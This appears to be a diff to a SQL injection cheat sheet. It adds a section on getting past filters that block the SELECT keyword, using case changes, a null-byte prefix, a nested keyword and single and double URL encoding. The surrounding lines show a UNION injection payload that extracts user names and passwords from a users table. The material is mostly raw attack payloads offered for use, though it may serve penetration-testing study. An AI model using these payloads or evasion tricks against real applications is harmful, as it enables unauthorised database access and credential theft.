@@ -84,6 +84,21 @@ etc.
 
 `%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`
 
+
+Circumventing Simple Validation
+-------------------------------
+
+If SELECT keyword is being blocked, try:
+
+```
+SeLeCt
+%00SELECT
+SELSELECTECT
+%53%45%4c%45%43%54
+%2553%2545%254c%2545%2543%2554
+```
+
+
 SQLMAP
 ------
 
